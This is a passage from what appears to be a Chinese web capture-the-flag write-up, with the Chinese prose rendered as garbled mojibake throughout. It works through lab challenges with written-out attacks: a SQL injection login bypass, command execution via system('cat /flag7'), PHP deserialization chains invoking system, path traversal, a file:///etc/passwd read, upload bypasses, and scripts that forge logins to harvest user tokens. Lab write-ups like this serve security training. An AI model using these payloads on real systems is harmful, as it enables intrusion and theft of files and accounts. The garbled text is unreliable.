yX3RoMXN\r\u0026lt;a href=\u0026#39;/flag4bbc.php\u0026#39;\u0026gt;å‰å¾€ä¸‹ä¸€å…³\u0026lt;/a\u0026gt; ç¬¬å››æ­¥ï¼Œåœ¨HTTPå¤´é‡ŒåŠ ä¸€ä¸ª Referer: http://localhost:8080/flag3cad.php?a=1 ï¼Œè·³è½¬åˆ°ç¬¬å››å…³\nåœ¨jsä»£ç ä¸­å¯ä»¥åªè¦æŒ‰é’®çš„idæ˜¯9å°±è¡Œäº†ï¼Œç›´æ¥F12ä¿®æ”¹å°±è¡Œ\næ­å–œä½ ï¼ä½ å·²ç»çŸ¥é“ï¼Œå‰ç«¯çš„ä¸€åˆ‡éƒ½æ˜¯å¯ä»¥æ›´æ”¹çš„ï¼\rflag4: fdFVUMHJ\rå‰å¾€ï¼š/flag5sxr.php ç¬¬äº”æ­¥ï¼Œå‰ç«¯jsæœ‰æ£€æŸ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥æŠ“åŒ…ä¿®æ”¹ï¼Œæˆ–è€…æµè§ˆå™¨è®¾ç½®é‡Œç¦ç”¨JSå³å¯\n\u0026lt;p\u0026gt;æ­å–œï¼Œæˆ‘ç›¸ä¿¡ä½ å·²ç»æ·±åˆ»äº†è§£äº†å‰ç«¯ä¸å¯ä¿¡ä»»çš„é“ç†!\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;flag5: fSV90aDF\u0026lt;/p\u0026gt;\r\u0026lt;a href=\u0026#39;flag6diw.php\u0026#39;\u0026gt;å‰å¾€ä¸‹ä¸€å…³\u0026lt;/a\u0026gt; ç¬¬å…­æ­¥ï¼Œæºç å¦‚ä¸‹,moeåœ¨æ— æ¨¡å¼çš„æ—¶å€™ä¸èƒ½ç›´æ¥åŒ¹é…åˆ°flagï¼Œä½†æ˜¯åœ¨å¿½ç•¥å¤§å°å†™çš„æ—¶å€™è¦åŒ¹é…åˆ°flagï¼Œé‚£ä¹ˆç›´æ¥ä¼ å‚ moe=FLAG å³å¯\n\u0026lt;?php\rhighlight_file(\u0026#34;flag6diw.php\u0026#34;);\rif (isset($_GET[\u0026#39;moe\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;moe\u0026#39;]) {\rif (preg_match(\u0026#39;/flag/\u0026#39;, $_GET[\u0026#39;moe\u0026#39;])) {\rdie(\u0026#34;no\u0026#34;);\r} elseif (preg_match(\u0026#39;/flag/i\u0026#39;, $_GET[\u0026#39;moe\u0026#39;])) {\recho \u0026#34;flag6: xxx\u0026#34;;\r}\r} flag6: rZV9VX2t ç¬¬ä¸ƒæ­¥ï¼ŒPOSTä¼ å‚ what=system(\u0026ldquo;cat /flag7 \u0026ldquo;);\nåœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°flag7ï¼Œå¹¶ä¸”å¾—åˆ°æç¤ºæ˜¯base64åŠ å¯†ï¼ŒæŠŠä¸ƒä¸ªflagæ‹¼ä¸€ä¸‹è§£å¯†å°±è¡Œäº†\nflag7: rbm93X1dlQn0= é™æ€ç½‘é¡µ #\rF12çœ‹åˆ°æœ‰è¿™å“¥/api/getçš„è¯·æ±‚ï¼Œè¿›å»æŸ¥çœ‹å°†idæ”¹ä¸º0ï¼ŒæŠ¥é”™å¼•å‡ºä¸€ä¸ªæ–°çš„phpæ–‡ä»¶å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(\u0026#39;final1l1l_challenge.php\u0026#39;);\rerror_reporting(0);\rinclude \u0026#39;flag.php\u0026#39;;\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_POST[\u0026#39;b\u0026#39;];\rif (isset($a) \u0026amp;\u0026amp; isset($b)) {\rif (!is_numeric($a) \u0026amp;\u0026amp; !is_numeric($b)) {\rif ($a == 0 \u0026amp;\u0026amp; md5($a) == $b[$a]) {\recho $flag;\r} else {\rdie(\u0026#39;noooooooooooo\u0026#39;);\r}\r} else {\rdie( \u0026#39;Notice the param type!\u0026#39;);\r}\r} else {\rdie( \u0026#39;Where is your param?\u0026#39;);\r} é¦–å…ˆaå’Œbéƒ½ä¸èƒ½æ˜¯æ•°å­—ï¼Œå¹¶ä¸”açš„å€¼è¦æ˜¯0ï¼Œb[a]ä¹Ÿè¦ç­‰äºaçš„md5å€¼ã€‚\næ€è·¯ï¼šaæ˜¯ä¸€ä¸ªmd5å¤„ç†å0eå¼€å¤´çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆå› ä¸ºæ˜¯ä¸¤ä¸ªç­‰å·ï¼Œå¼±æ¯”è¾ƒï¼Œ0exxxxéƒ½ç­‰äº0ï¼‰ã€‚bçš„ç¬¬ä¸€ä¸ªå­—ç¬¦åº”è¯¥æ˜¯0ï¼Œå¹¶ä¸”ä¸èƒ½æ˜¯çº¯æ•°å­—ã€‚\nç”µé™¢_Backend #\råœ¨robots.txtä¸­å‘ç°/adminè·¯ç”±ï¼Œè¿›å»æ˜¯ç™»é™†ç•Œé¢ï¼Œæºç æœ‰ç‚¹é•¿ï¼Œè¿™é‡Œåªçœ‹æœ‰ç”¨çš„åœ°æ–¹\nif(!preg_match(\u0026#34;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\\\.[a-zA-Z0-9]+/\u0026#34;, $email)||preg_match(\u0026#34;/or/i\u0026#34;, $email)){\recho json_encode(array(\u0026#39;status\u0026#39; =\u0026gt; 0,\u0026#39;info\u0026#39; =\u0026gt; \u0026#39;ä¸å­˜åœ¨é‚®ç®±ä¸ºï¼š \u0026#39;.$email.\u0026#39; çš„ç®¡ç†å‘˜è´¦å·ï¼\u0026#39;));\runset($_SESSION[\u0026#39;captcha_code\u0026#39;]);\rexit;\r}\r$sql = \u0026#34;SELECT * FROM admin WHERE email=\u0026#39;$email\u0026#39; AND pwd=\u0026#39;$pwd\u0026#39;\u0026#34;; è¿™é‡Œé‚®ç®±å°±åªæ˜¯ä¸€ä¸ªæ­£å¸¸é‚®ç®±æ ¼å¼ï¼Œå¹¶ä¸”å…¶ä¸­ä¸èƒ½æœ‰orå…³é”®å­—ï¼Œsqlè¯­å¥ä¹Ÿåªæ˜¯ç®€å•çš„å•å¼•å·é—­åˆ\nå¯†ç éšä¾¿è¾“ï¼Œè´¦å·å¦‚å›¾å°±è¡Œäº†ï¼Œç›´æ¥æˆªæ–­æ‰äº†åé¢çš„pwdã€‚\npop moe #\ræ•´ä¸ªpopé“¾æ¡æ˜¯å¾ˆç®€å•çš„ï¼Œä»000åˆ°003ç›´æ¥èµ°ä¸‹æ¥å°±è¡Œäº†ï¼Œä¹Ÿä¸å¤šè¯´äº†\n\u0026lt;?php\rclass class000 {\rprivate $payl0ad = 1;\rprotected $what;\rfunction __construct()\r{\r$this-\u0026gt;what=new class001();\r}\r}\rclass class001 {\rpublic $payl0ad=\u0026#34;dangerous\u0026#34;;\rpublic $a;\rfunction __construct()\r{\r$this-\u0026gt;a=new class002();\r}\r}\rclass class002 {\rprivate $sec;\rfunction __construct()\r{\r$this-\u0026gt;sec=new class003();\r}\r}\rclass class003 {\rpublic $mystr=\u0026#34;phpinfo()\u0026#34;;\r}\recho serialize(new class000());\rhttp://127.0.0.1:58271/?data=O:8:\u0026#34;class000\u0026#34;:2:{s:17:\u0026#34;%00class000%00payl0ad\u0026#34;;i:1;s:7:\u0026#34;%00*%00what\u0026#34;;O:8:\u0026#34;class001\u0026#34;:2:{s:7:\u0026#34;payl0ad\u0026#34;;s:9:\u0026#34;dangerous\u0026#34;;s:1:\u0026#34;a\u0026#34;;O:8:\u0026#34;class002\u0026#34;:1:{s:13:\u0026#34;%00class002%00sec\u0026#34;;O:8:\u0026#34;class003\u0026#34;:1:{s:5:\u0026#34;mystr\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}} æŠŠprivateå’Œprotectçš„ä¸å¯è§å­—ç¬¦æ›¿æ¢æˆ%00å°±è¡Œäº†\nå‹‡é—¯é“œäººé˜µ #\rå…¸å‹çš„pythoné¢˜ç›®ï¼Œå…ˆæŸ¥çœ‹ç­”æ¡ˆåœ¨ç½‘é¡µæºç ä¸­çš„æ ¼å¼\nimport re\rimport requests\rrequest = requests.session()\rurl = \u0026#34;http://127.0.0.1:53218/\u0026#34;\rbegin = {\u0026#34;player\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;direct\u0026#34;: \u0026#34;å¼Ÿå­æ˜ç™½\u0026#34;}\rpattern = re.compile(\u0026#39;\u0026lt;h1 id=\u0026#34;status\u0026#34;\u0026gt;\\s*(.+?)\\s*\u0026lt;/h1\u0026gt;\u0026#39;)\r# æ–¹å‘æ˜ å°„\rdirections_map = {\r\u0026#34;1\u0026#34;: \u0026#34;åŒ—æ–¹\u0026#34;,\r\u0026#34;2\u0026#34;: \u0026#34;ä¸œåŒ—æ–¹\u0026#34;,\r\u0026#34;3\u0026#34;: \u0026#34;ä¸œæ–¹\u0026#34;,\r\u0026#34;4\u0026#34;: \u0026#34;ä¸œå—æ–¹\u0026#34;,\r\u0026#34;5\u0026#34;: \u0026#34;å—æ–¹\u0026#34;,\r\u0026#34;6\u0026#34;: \u0026#34;è¥¿å—æ–¹\u0026#34;,\r\u0026#34;7\u0026#34;: \u0026#34;è¥¿æ–¹\u0026#34;,\r\u0026#34;8\u0026#34;: \u0026#34;è¥¿åŒ—æ–¹\u0026#34;\r}\rdef format_directions(nums):\rif len(nums) == 1:\r# åˆ—è¡¨ä¸­åªæœ‰ä¸€ä¸ªæ•°å­—ï¼Œç›´æ¥è¿”å›æ–¹å‘åç§°\rdirection = directions_map.get(nums[0], \u0026#34;æœªçŸ¥\u0026#34;)\rreturn f\u0026#34;{direction}\u0026#34;\rformatted_directions = []\rfor num in nums:\rdirection = directions_map.get(num, \u0026#34;æœªçŸ¥\u0026#34;)\rformatted_directions.append(f\u0026#34;{direction}ä¸€ä¸ª\u0026#34;)\rreturn \u0026#34;ï¼Œ\u0026#34;.join(formatted_directions)\rfor i in range(6):\rif i == 0:\rresponse = request.post(url=url, data=begin)\rprint(response.text)\relse:\rdirect_str = format_directions(nums)\rprint(direct_str, \u0026#34;direct\u0026#34;)\rresponse = request.post(url=url, data={\u0026#34;player\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;direct\u0026#34;: direct_str})\rprint(response.text)\rnum = re.findall(pattern, response.text)[0]\rnums = re.findall(r\u0026#39;\\d+\u0026#39;, num) # ç›´æ¥ä½¿ç”¨æå–å‡ºæ¥çš„é¡ºåº\rdirections = [directions_map.get(n, \u0026#34;æœªçŸ¥\u0026#34;) for n in nums]\rprint(f\u0026#34;æ–¹å‘æ•°å­—: {nums}\u0026#34;)\rprint(f\u0026#34;å¯¹åº”æ–¹ä½: {directions}\\n\u0026#34;) Re: ä»é›¶å¼€å§‹çš„ XDU æ•™ä¹¦ç”Ÿæ´» #\ré¢˜ç›®ä¿¡æ¯\næœ¬é¢˜çº¦å®šï¼šæ‰€æœ‰è´¦å·çš„ç”¨æˆ·å == æ‰‹æœºå· == å¯†ç ã€‚æ•™å¸ˆè´¦å·ç”¨æˆ·åï¼š10000ã€‚\nå½“æµè§ˆå™¨å¼€å¯ç­¾åˆ°é¡µé¢æ—¶ï¼ŒäºŒç»´ç æ¯ 10 ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œä½¿ç”¨è¿‡æœŸçš„äºŒç»´ç æ— æ³•å®Œæˆç­¾åˆ°ã€‚ï¼ˆæµè§ˆå™¨ä¸å¼€å¯ç­¾åˆ°é¡µé¢æ—¶ï¼Œä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆ·æ–°ï¼Œå¯ä»¥æŒç»­ä½¿ç”¨æœ‰æ•ˆçš„äºŒç»´ç ï¼Œé™¤éæ‰‹åŠ¨å‘é€åˆ·æ–°äºŒç»´ç çš„è¯·æ±‚ï¼‰ å½“ä½ å®Œæˆä»»åŠ¡åï¼Œè¯·ç»“æŸç­¾åˆ°æ´»åŠ¨ã€‚ä½ å°†ä¼šè·å¾— Flag ã€‚\nä¹Ÿæ˜¯ä¸€ä¸ªå†™è„šæœ¬çš„é—®é¢˜ï¼Œåªä¸è¿‡æ¯”é“œäººé˜µè¦å¤æ‚ä¸€ç‚¹ç‚¹ï¼Œç”±äºä»£ç è¿‡é•¿ï¼Œè¿™é‡Œåªè®²æ€è·¯ã€‚\nç™»å½•æ¥å£æŠ“åŒ…å¯ä»¥å‘ç°ï¼Œunameå’Œpasswordæ˜¯ç»è¿‡åŠ å¯†çš„ï¼ŒåŠ å¯†é€»è¾‘æ²¡æœ‰ç›´æ¥ç»™å‡ºï¼Œä½†æ˜¯è§£å¯†é€»è¾‘åœ¨app.pyä¸­æœ‰ï¼Œå¯ä»¥é€†æ¨åˆ°åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·å°±èƒ½å¯¹æ¯ä¸ªå­¦ç”Ÿè¿›è¡Œç™»é™†æ“ä½œè·å–è¯¥å­¦ç”Ÿçš„tokenï¼ˆè€å¸ˆçš„tokenä¹Ÿèƒ½è¿™æ ·è·å–åˆ°ï¼‰\n#burpsuite\rPOST /fanyalogin HTTP/1.1\r#çœç•¥æ‰ä¸é‡è¦çš„éƒ¨åˆ†\rCookie: token=4ba20ea2-5458-4d48-beaf-0e4a61bcbe08; retainlogin=1\rfid=-1\u0026amp;uname=/LgCkbIdwG1Do95thvCwcA==\u0026amp;password=/LgCkbIdwG1Do95thvCwcA==\u0026amp;refer=https%3A%2F%2Fi.chaoxing.com\u0026amp;t=true\u0026amp;forbidotherlogin=0\u0026amp;validate=\u0026amp;doubleFactorLogin=0\u0026amp;independentId=0\u0026amp;independentNameId=0\r#app.py\rdef decrypt_by_aes(encrypted: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rencrypted_bytes = base64.b64decode(encrypted)\rdecrypted_bytes = cipher.decrypt(encrypted_bytes)\rpad = decrypted_bytes[-1]\rdecrypted_bytes = decrypted_bytes[:-pad]\rdecrypted = decrypted_bytes.decode(\u0026#34;utf-8\u0026#34;)\rreturn decrypted\r#æ®æ­¤é€†æ¨å‡ºåŠ å¯†å‡½æ•°ï¼Œå¯å€ŸåŠ©AIç”Ÿæˆä»£ç \rdef encrypt_by_aes(plain_text: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rpad = 16 - (len(plain_text) % 16)\rpadded_text = plain_text + chr(pad) * pad\rencrypted_bytes = cipher.encrypt(padded_text.encode(\u0026#34;utf-8\u0026#34;))\rencrypted_base64 = base64.b64encode(encrypted_bytes).decode(\u0026#34;utf-8\u0026#34;)\rreturn encrypted_base64 å°†è€å¸ˆé¡µé¢çš„äºŒç»´ç å¦å­˜åˆ°æ¡Œé¢ï¼Œå¹¶ä¸”ä¸Šä¼ ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®äº†è¿™ä¸ªè·¯ç”±å¹¶ä¸”ä¼ äº†å‚æ•°\nå›åˆ°ä»£ç ï¼Œå…¶ä¸­éœ€è¦æ‰‹åŠ¨æ›´æ”¹çš„å‚æ•°åªæœ‰cå’Œencï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„å…¨å±€å˜é‡ï¼Œè€ŒäºŒç»´ç çš„ç”Ÿæˆé€»è¾‘é‡Œå¯ä»¥çœ‹å‡ºæ˜¯æœ‰è¿™ä¸¤ä¸ªå‚æ•°çš„\n@app.route(\u0026#34;/widget/sign/e\u0026#34;, methods=[\u0026#34;GET\u0026#34;])\rdef e():\rtoken = request.cookies.get(\u0026#34;token\u0026#34;)\rif token is None or token not in token_user or token_user[token] == teacher_phone:\rreturn redirect(\u0026#34;/login\u0026#34;)\rif request.args.get(\u0026#34;id\u0026#34;) != str(active_id) or request.args.get(\u0026#34;c\u0026#34;) != sign_code or request.args.get(\u0026#34;enc\u0026#34;) != enc:\rreturn \u0026#34;äºŒç»´ç å·²è¿‡æœŸã€‚\u0026#34;\ruid = token_user[token]\rfor i in sign_list:\rif i[\u0026#34;uid\u0026#34;] == int(uid):\rif i[\u0026#34;status\u0026#34;] == 0:\rif active_status == 2:\ri[\u0026#34;status\u0026#34;] = 11\relse:\ri[\u0026#34;status\u0026#34;] = 1\rreturn status[i[\u0026#34;status\u0026#34;]]\r@app.route(\u0026#34;/v2/apis/sign/refreshQRCode\u0026#34;, methods=[\u0026#34;GET\u0026#34;])\rdef refreash_QRCode():\rglobal sign_code, enc\rsign_code = str(random.randint(3000000000000, 4000000000000))\renc = \u0026#34;\u0026#34;.join(random.choice([\u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;]) for _ in range(32))\rresponse = {\r\u0026#34;result\u0026#34;: 1,\r\u0026#34;msg\u0026#34;: \u0026#34;success\u0026#34;,\r\u0026#34;data\u0026#34;: {\r\u0026#34;enc\u0026#34;: enc,\r\u0026#34;signCode\u0026#34;:sign_code\r}, \u0026#34;errorMsg\u0026#34;: None\r}\rreturn jsonify(response) **é‚£ä¹ˆæ•´ä½“çš„æ€è·¯å°±æ¥äº†ï¼š**å…ˆè¦ç”¨è€å¸ˆè´¦å·ç™»å½•è·å–åˆ°å­¦ç”Ÿåˆ—è¡¨ï¼Œç„¶åè·å–æ—¶é—´æˆ³å’Œencï¼Œä½¿ç”¨å­¦ç”Ÿçš„è´¦å·ç™»å½•è·å–åˆ°å­¦ç”Ÿtokenï¼Œå†ç”¨å­¦ç”Ÿèº«ä»½æŠŠæ—¶é—´æˆ³å’Œencå¸¦åˆ°æ‰«æäºŒç»´ç çš„è·¯ç”±\nå®Œæ•´ä»£ç \n#ä¸»ç¨‹åº.py\rfrom è·å–å­¦ç”Ÿåˆ—è¡¨ import get_student_list\rfrom ç™»å½•è·å–token import getToken\rfrom è·å–æ—¶é—´æˆ³å’Œenc import get_timestamp_and_enc\rfrom æ‰«æäºŒä½ç  import scan_qrcode\rimport concurrent.futures\rstudent_list = get_student_list()\renc, signcode = get_timestamp_and_enc() # è·å–encå’Œsigncode\rdef process_student(index):\rtemp_token = getToken(student_list[index]) # è·å–å•ä¸ªå­¦ç”Ÿçš„token\rscan_qrcode(sign_code=signcode, enc=enc, token=temp_token) # æ‰«æäºŒç»´ç \rreturn index\rwith concurrent.futures.ThreadPoolExecutor() as executor:\rfutures = [executor.submit(process_student, i) for i in range(len(student_list))]\rfor future in concurrent.futures.as_completed(futures):\ri = future.result()\rprint(i) #ç™»å½•è·å–token.py\rimport requests\rfrom Crypto.Cipher import AES\rimport base64\rimport json\rimport re\rdef encrypt_by_aes(plain_text: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rpad = 16 - (len(plain_text) % 16)\rpadded_text = plain_text + chr(pad) * pad\rencrypted_bytes = cipher.encrypt(padded_text.encode(\u0026#34;utf-8\u0026#34;))\rencrypted_base64 = base64.b64encode(encrypted_bytes).decode(\u0026#34;utf-8\u0026#34;)\rreturn encrypted_base64\rdef getToken(uname):\rpattern = re.compile(\u0026#34;token=(.*); E\u0026#34;)\rpoststr=encrypt_by_aes(uname,\u0026#34;u2oh6Vu^HWe4_AES\u0026#34;,\u0026#34;u2oh6Vu^HWe4_AES\u0026#34;)\rurl = \u0026#34;http://127.0.0.1:59835/fanyalogin\u0026#34;\rdata = {\r\u0026#34;fid\u0026#34;: \u0026#34;-1\u0026#34;,\r\u0026#34;uname\u0026#34;:f\u0026#34;{poststr}\u0026#34; ,\r\u0026#34;password\u0026#34;:f\u0026#34;{poststr}\u0026#34;,\r\u0026#34;refer\u0026#34;: \u0026#34;https://i.chaoxing.com\u0026#34;,\r\u0026#34;t\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;forbidotherlogin\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;validate\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;doubleFactorLogin\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;independentId\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;independentNameId\u0026#34;: \u0026#34;0\u0026#34;\r}\rheaders=requests.post(url=url,data=data).headers[\u0026#39;Set-Cookie\u0026#39;]\rreturn re.findall(pattern,headers)[0] #è·å–å­¦ç”Ÿåˆ—è¡¨.py\rimport requests\rimport json\rfrom ç™»å½•è·å–token import getToken\rdef get_student_list():\r# åˆ›å»ºä¸€ä¸ªä¼šè¯\rrequest = requests.session()\r# è¯·æ±‚çš„URL\rurl = \u0026#34;http://127.0.0.1:59835/widget/sign/pcTeaSignController/showSignInfo1?activeId=4000000000000\u0026amp;webCacheId=4000000000000\u0026amp;appType=15\u0026amp;_=1723951358863\u0026#34;\rteacher_token=getToken(\u0026#39;10000\u0026#39;)\r# è®¾ç½®Cookie\rcookie = {\u0026#34;retainlogin\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;token\u0026#34;: f\u0026#34;{teacher_token}\u0026#34;} #ç”¨è€å¸ˆçš„èº«ä»½æ¥è¿›è¡Œè·å–å­¦ç”Ÿ\r# å‘é€GETè¯·æ±‚\rreq = request.get(url=url, cookies=cookie)\r# è§£æå“åº”çš„JSONå†…å®¹\rdata = json.loads(req.text)\r# ä»è§£æçš„JSONä¸­æå–nameå­—æ®µ\rname_list = [item[\u0026#34;name\u0026#34;] for item in data[\u0026#34;data\u0026#34;][\u0026#34;changeUnSignList\u0026#34;]]\rprint(teacher_token)\rreturn name_list\rprint(get_student_list()) #è·å–æ—¶é—´æˆ³å’Œenc.py\rfrom datetime import datetime, timedelta, timezone\rimport json\rimport requests\rfrom ç™»å½•è·å–token import getToken\rdef get_current_timestamp() -\u0026gt; int:\rreturn int(datetime.now().timestamp() * 1000)\rdef get_timestamp_and_enc():\rbase_url= \u0026#34;http://127.0.0.1:62019\u0026#34;\rget_enc_signCode = f\u0026#34;{base_url}/v2/apis/sign/refreshQRCode?activeId=4000000000000\u0026amp;time={get_current_timestamp()}\u0026amp;viewFrom=\u0026amp;viceScreen=0\u0026amp;viceScreenEwmEnc=\u0026#34;\rtoken=getToken(\u0026#34;10000\u0026#34;)\rreq=requests.get(get_enc_signCode,headers={\r\u0026#34;Cookie\u0026#34;:f\u0026#34;token={token}; retainlogin=1\u0026#34;\r})\rresponse_body=json.loads(req.content.decode())\renc = response_body[\u0026#39;data\u0026#39;][\u0026#39;enc\u0026#39;]\rsigncode = response_body[\u0026#39;data\u0026#39;][\u0026#39;signCode\u0026#39;]\rprint(enc,signcode)\rreturn (enc,signcode) #æ‰«æäºŒç»´ç .py\rimport requests\rfrom è·å–æ—¶é—´æˆ³å’Œenc import get_timestamp_and_enc\rdef scan_qrcode(sign_code,enc,token):\rrequest= requests.session()\rurl=\u0026#34;http://127.0.0.1:62019/widget/sign/e\u0026#34;\rurl_data=f\u0026#34;?id=4000000000000\u0026amp;c={sign_code}\u0026amp;enc={enc}\u0026amp;DB_STRATEGY=PRIMARY_KEY\u0026amp;STRATEGY_PARA=id\u0026#34;\rrequest.get(url=url+url_data,headers={\r\u0026#34;Cookie\u0026#34;:f\u0026#34;token={token}; retainlogin=1\u0026#34;\r}) å› ä¸ºäºŒç»´ç æ˜¯10ç§’ä¼šåˆ·æ–°ä¸€ä¸‹ï¼Œå¤šè¿è¡Œå‡ æ¬¡ä¸»ç¨‹åºå°±å¥½äº†ã€‚ï¼ˆæ‡’å¾—æ”¹ä»£ç ï¼‰\næ¬¢è¿æ¥åˆ°å«åˆ€ä¹‹è·¯ #\rä¸€ä¸ªç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œcat /flagä¹‹åæç¤ºè¯´åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚\næœ‰å¯èƒ½ä¼šåœ¨/proc/1/environé‡Œï¼Œä½†æ˜¯éå†è¿‡åå‘ç°ä¸å­˜åœ¨ã€‚å‘ç°å¯ä»¥ä½¿ç”¨phpçš„å‘½ä»¤è¡Œå½¢å¼æ¥æ‰§è¡Œï¼Œæœç´¢å­—ç¬¦ä¸²å³å¯\nphp -r \u0026#34;phpinfo();\u0026#34; ImageCloudå‰ç½® #\rå‘½ä»¤æ‰§è¡Œ+phpä¼ªåè®®è¯»å–/etc/passwd\nhttp://127.0.0.1:53159/index.php?url=file:///etc/passwd å«åˆ€ä¹‹è·¯02: æ™®é€šçš„æ–‡ä»¶ä¸Šä¼  #\rmimeç±»å‹æŠ“åŒ…ä¿®æ”¹ä¸ºimage/jpegå³å¯ç»•è¿‡\nå«åˆ€ä¹‹è·¯03: è¿™æ˜¯ä¸€ä¸ªå›¾åºŠ #\rå‰ç«¯æ–‡ä»¶ååç¼€æ ¡éªŒï¼Œå°†æ­£å¸¸æœ¨é©¬åç¼€æ”¹ä¸ºjpgï¼Œç„¶åæŠ“åŒ…æ”¹å›å³å¯\nå«åˆ€ä¹‹è·¯04: ä¸€ä¸ªæ–‡ä»¶æµè§ˆå™¨ #\rhttp://127.0.0.1:55317/?path=../../../../../../var/www/html/index.php æµ‹è¯•å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šè¯»å–æ•°æ®ï¼Œå¹¶ä¸”åœ¨index.phpé‡Œçœ‹åˆ°äº†å¦‚æœpathæ˜¯ä¸ªç›®å½•è¿˜ä¼šæŠŠç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶åŠç›®å½•è¿”å›åˆ°é¡µé¢ä¸­ï¼Œä¸€ä¸ªä¸€ä¸ªç‚¹è¿›å»çœ‹ï¼Œåœ¨æ ¹ç›®å½•ä¸‹/tmp/flagæ‰¾åˆ°\nå«åˆ€ä¹‹è·¯05: ç™»é™†ç½‘ç«™ #\ræŠ“ä¸ªåŒ…è®¾ç½®passwordå­—æ®µï¼Œpayloadå¯ä»¥ç”¨burpsuiteè‡ªå¸¦çš„sqlå­—å…¸ï¼Œä¹Ÿå¯ä»¥ä»ç½‘ä¸Šæ‰¾ã€‚\nusername=admin123\u0026amp;password=123\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\r#å•å¼•å·é—­åˆ å«åˆ€ä¹‹è·¯06: pop base mini moe #\r\u0026lt;?php\rclass A {\r// æ³¨æ„ private å±æ€§çš„åºåˆ—åŒ–å“¦\rprivate $evil;\r// å¦‚ä½•èµ‹å€¼å‘¢\rprivate $a;\rfunction __construct()\r{\r$this-\u0026gt;a=new B();\r$this-\u0026gt;evil=\u0026#34;ls\u0026#34;;\r}\r}\rclass B {\rprivate $b=\u0026#34;system\u0026#34;;\r}\recho serialize(new A());\rhttp://127.0.0.1:63135/?data=O:1:\u0026#34;A\u0026#34;:2:{s:7:\u0026#34;%00A%00evil\u0026#34;;s:9:\u0026#34;cat /flag\u0026#34;;s:4:\u0026#34;%00A%00a\u0026#34;;O:1:\u0026#34;B\u0026#34;:1:{s:4:\u0026#34;%00B%00b\u0026#34;;s:6:\u0026#34;system\u0026#34;;}} å«åˆ€ä¹‹è·¯07: æ³„æ¼çš„å¯†ç  #\ré¡µé¢ç»™äº†pinç ï¼Œè¿›å…¥/consoleè·¯ç”±ï¼Œè¾“å…¥pinç è¿›å…¥ç»ˆç«¯ã€‚\nç¯å¢ƒå˜é‡ä¸­æ‹¿åˆ°flag\nImageCloud #\ré¢˜ç›®ä¿¡æ¯ç»™å‡ºï¼Œflagåœ¨åä¸ºflag.jpgçš„å›¾ç‰‡ä¸­ï¼Œå¹¶ä¸”é™„ä»¶ä¸­flag.jpgå­˜åœ¨äºuploadsæ–‡ä»¶å¤¹ã€‚\né™„ä»¶ä¸­å­˜åœ¨ä¸¤ä¸ªflaskæœåŠ¡çš„pythonæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯5000ç«¯å£çš„å¤–éƒ¨äº‘æ–‡ä»¶ï¼Œä¿å­˜å›¾ç‰‡è·¯å¾„ä¸ºstaticï¼Œå¦ä¸€ä¸ªæ˜¯ç«¯å£åœ¨5001åˆ°6000ä¸­é—´éšæœºçš„å†…éƒ¨äº‘æ–‡ä»¶ï¼Œä¿å­˜è·¯å¾„æ˜¯uploadsã€‚\n#å¤–éƒ¨äº‘\r@app.route(\u0026#39;/image\u0026#39;, methods=[\u0026#39;GET\u0026#39;])\rdef load_image():\rurl = request.args.get(\u0026#39;url\u0026#39;)\rif not url:\rreturn \u0026#39;URL å‚æ•°ç¼ºå¤±\u0026#39;, 400\rtry:\rresponse = requests.get(url)\rresponse.raise_for_status()\rimg = Image.open(BytesIO(response.content))\rimg_io = BytesIO()\rimg.save(img_io, img.format)\rimg_io.seek(0)\rreturn send_file(img_io, mimetype=img.get_format_mimetype())\rexcept Exception as e:\rreturn f\u0026#34;æ— æ³•åŠ è½½å›¾ç‰‡: {str(e)}\u0026#34;, 400 